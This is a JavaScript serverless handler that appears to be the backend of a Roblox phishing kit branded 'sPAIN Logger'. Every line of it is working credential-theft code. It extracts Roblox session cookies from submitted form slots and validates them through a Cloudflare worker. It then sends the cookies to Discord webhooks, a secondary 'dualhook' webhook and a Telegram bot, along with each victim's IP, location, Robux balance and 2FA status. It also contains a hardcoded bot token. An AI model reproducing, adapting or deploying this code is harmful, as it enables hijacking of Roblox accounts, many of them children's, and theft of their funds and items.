// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

// ── Helpers ───────────────────────────────────────────────────────────────────

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Wraps any fetch with a hard timeout so one slow call can't crash everything
async function fetchWithTimeout(url, opts = {}, ms = 8000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  try {
    return await fetch(url, { ...opts, signal: controller.signal });
  } catch (e) {
    if (e.name === 'AbortError') console.warn(`Timeout: ${url}`);
    throw e;
  } finally {
    clearTimeout(timer);
  }
}

// ── Body parser — handles object, string, Buffer safely ──────────────────────
function parseBody(raw) {
  if (!raw) return {};
  // Already parsed by Vercel (most common case)
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try {
    const str = Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw);
    return JSON.parse(str);
  } catch {
    return {};
  }
}

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res = await fetchWithTimeout(
      `${REDIS_URL}/get/${encodeURIComponent(key)}`,
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } },
      5000
    );
    const json = await res.json();
    if (!json.result) return null;
    if (typeof json.result === 'object') return json.result;
    return JSON.parse(json.result);
  } catch { return null; }
}

// ── IP Geo ────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetchWithTimeout(
      `http://ip-api.com/json/${ip}?fields=status,country,city,isp`,
      {},
      4000
    );
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

// ── Cookie extractor — scans every slot value ────────────────────────────────
const WARN_PREFIX = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (m2) return WARN_PREFIX + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);
  if (m3) return WARN_PREFIX + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN_PREFIX + s;
  return null;
}

function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// ── Cloudflare Worker call ────────────────────────────────────────────────────
async function getRobloxInfo(cookie, victimIp) {
  try {
    const r = await fetchWithTimeout(
      WORKER_URL,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, victimIp })
      },
      9000   // worker has up to 9s before we give up
    );
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

// ── Slot summary text ─────────────────────────────────────────────────────────
function slotSummary(slots) {
  return Object.entries(slots || {})
    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
    .join('\n');
}

// ── Discord send (with retry once) ───────────────────────────────────────────
async function discordSend(url, payload, attempt = 1) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    const r = await fetchWithTimeout(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }, 6000);

    // 429 = rate limited — wait and retry once
    if (r.status === 429 && attempt === 1) {
      const retry = r.headers.get('retry-after');
      await sleep(retry ? parseFloat(retry) * 1000 : 2000);
      return discordSend(url, payload, 2);
    }
  } catch (_) {}
}

// Build the embed for a valid Roblox cookie hit
async function sendValid(webhookUrl, { roblox, cookie, slots, ip, geo, now, pageName }) {
  const embed = {
    title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
    description: `:fire: \`sPAIN\` :fire:\n\n[👤 Profile](https://www.roblox.com/users/${roblox.id}/profile)`,
    color: 5793266,
    thumbnail: { url: roblox.avatarUrl },
    fields: [
      { name: '🔴 Robux',      value: `**${roblox.robux?.toLocaleString() || 0}**`,                                           inline: true  },
      { name: '🎵 RAP',        value: `**${roblox.limitedsValue?.toLocaleString() || 0}** (${roblox.limitedsCount || 0})`,   inline: true  },
      { name: '📊 Age',        value: `**${roblox.accountAgeDays}** days`,                                                    inline: true  },
      { name: '💳 Credit',     value: `**$${roblox.credit || 0}**`,                                                           inline: true  },
      { name: '🎫 Premium',    value: roblox.isPremium ? '✅ Yes' : '❌ No',                                                  inline: true  },
      { name: '👥 Groups',     value: `Owned: **${roblox.groupsOwned}** | R$: **${roblox.groupRobux?.toLocaleString() || 0}**`, inline: true },
      { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}\n2FA: ${roblox.twoFA}`,                                     inline: true  },
      { name: '🌐 IP',         value: `\`${ip || 'Unknown'}\``,                                                               inline: true  },
      { name: '📍 Location',   value: `${geo?.city || '?'}, ${geo?.country || '?'}\n${geo?.isp || ''}`,                      inline: true  },
      {
        name: '🎮 Gamepasses',
        value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`,
        inline: false
      },
      { name: '📋 Slots',      value: `\`\`\`${slotSummary(slots).substring(0, 950)}\`\`\``, inline: false },
      { name: '🔐 Cookie',     value: `\`\`\`${cookie.substring(0, 950)}\`\`\``,             inline: false }
    ],
    footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
  };
  await discordSend(webhookUrl, { content: '@everyone', embeds: [embed] });
}

// Build the embed for an invalid / fake cookie
async function sendInvalid(webhookUrl, { slots, ip, geo, now, pageName }) {
  const embed = {
    title: '⚠️ Invalid Cookie — trolling 💀',
    description: 'Cookie was **invalid or fake**.',
    color: 0xff3333,
    fields: [
      { name: '🌐 IP',       value: `\`${ip || 'Unknown'}\``,                              inline: true  },
      { name: '📍 Location', value: `${geo?.city || '?'}, ${geo?.country || '?'}`,          inline: true  },
      { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                 inline: true  },
      { name: '📋 Slots',    value: `\`\`\`${slotSummary(slots).substring(0, 950)}\`\`\``, inline: false },
      { name: '🕐 Date',     value: now,                                                    inline: false }
    ],
    footer: { text: `sPAIN Tools • ${pageName}` },
    timestamp: now
  };
  await discordSend(webhookUrl, { content: '@everyone', embeds: [embed] });
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetchWithTimeout(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    }, 5000);
  } catch (_) {}
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  // ── 1. Parse body (handles object / string / Buffer) ─────────────────────
  const body = parseBody(req.body);
  const { slug, slots } = body;

  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  // ── 2. Load Redis record ──────────────────────────────────────────────────
  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  // ── 3. Respond immediately so the client never sees a timeout ─────────────
  res.status(200).json({ success: true });

  // ── 4. All heavy work runs AFTER the 200 response ─────────────────────────
  try {
    // Step A: IP + geo (cheap, do first)
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            || req.headers['x-real-ip']
            || 'Unknown';

    const geo = await getIpGeo(ip);
    await sleep(200); // brief pause before Roblox work

    // Step B: find cookie across all slots
    const cookie = findCookie(slots);

    // Step C: call Cloudflare worker (can take a few seconds — that's fine now)
    const roblox = cookie ? await getRobloxInfo(cookie, ip) : null;
    const isValid = !!roblox;
    const now     = new Date().toISOString();
    const pageName = record.displayName || slug;
    const finalCookie = cookie;

    const payload = { roblox, cookie: finalCookie, slots, ip, geo, now, pageName };

    await sleep(300); // small pause before first Discord send

    // Step D: send to webhook2 (the record's own webhook — always)
    const sendFn = isValid ? sendValid : sendInvalid;
    await sendFn(record.webhook, payload);

    // Step E: dualhook parent webhook (webhook1) — only if this is a child page
    if (record.dualhookParent) {
      await sleep(600); // wait before second send to avoid rate limit
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendFn(parent.webhook, payload);
      }
    }

    await sleep(300); // pause before Telegram

    // Step F: Telegram master log
    await tgSend(isValid ? [
      `🚨 <b>VALID HIT</b>`,
      `👤 <b>${roblox.username}</b> ${roblox.isPremium ? '⭐' : ''}`,
      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city || '?'}, ${geo?.country || '?'}`,
      `📄 Page: ${pageName}`,
      `🍪 Cookie: ✅ Captured`
    ].join('\n') : [
      `⚠️ <b>INVALID SUBMISSION</b>`,
      `📄 Page: ${pageName} (${slug})`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city || '?'}, ${geo?.country || '?'}`,
      `🕐 ${now}`
    ].join('\n'));

  } catch (err) {
    // Log but don't crash — response was already sent
    console.error('Post-response error:', err.message);
  }
}
